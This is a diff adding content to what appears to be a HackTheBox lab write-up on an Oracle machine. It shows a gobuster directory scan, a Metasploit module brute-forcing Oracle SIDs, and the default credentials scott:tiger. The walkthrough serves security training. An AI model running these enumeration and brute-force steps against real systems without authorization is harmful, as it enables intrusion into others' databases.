@@ -66,7 +66,24 @@ Nmap done: 1 IP address (1 host up) scanned in 3066.66 seconds
 
 Gobuster HTTP:
 {% highlight shell %}
-
+root@kali:~# gobuster dir -u http://10.10.10.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.aspx -s '200,204,301,302,403'
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.82/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,aspx
+[+] Timeout:        10s
+===============================================================
+2019/11/06 16:54:45 Starting gobuster
+===============================================================
+===============================================================
+2019/11/06 18:05:09 Finished
+===============================================================
 {% endhighlight %}
 
 ### 2. Getting User
@@ -76,10 +93,34 @@ Then, try to take a look at Oracle TNS listener.<br>
 At first, try to get SIDs.<br>
 <em>The Oracle System ID (SID) is used to uniquely identify a particular database on a system. For this reason, one cannot have more than one database with the same SID on a computer system.</em>
 {% highlight shell %}
+msf5 auxiliary(admin/oracle/sid_brute) > use auxiliary/admin/oracle/sid_brute 
+msf5 auxiliary(admin/oracle/sid_brute) > set rhost 10.10.10.82
+rhost => 10.10.10.82
+msf5 auxiliary(admin/oracle/sid_brute) > show options
 
+Module options (auxiliary/admin/oracle/sid_brute):
+
+   Name     Current Setting                                         Required  Description
+   ----     ---------------                                         --------  -----------
+   RHOSTS   10.10.10.82                                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    1521                                                    yes       The target port (TCP)
+   SIDFILE  /usr/share/metasploit-framework/data/wordlists/sid.txt  no        The file that contains a list of sids.
+   SLEEP    1                                                       no        Sleep() amount between each request.
+
+msf5 auxiliary(admin/oracle/sid_brute) > run
+[*] Running module against 10.10.10.82
+
+[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc'
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID ''
+[*] 10.10.10.82:1521 - Done with brute force...
+[*] Auxiliary module execution completed
 {% endhighlight %}
 
 Next, brute force the valid credentials.<br>
+To set up the Oracle client on Kali, we can read <a hreh="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">this page</a>
 We can find following username/password.
 {% highlight shell %}
 scott:tiger
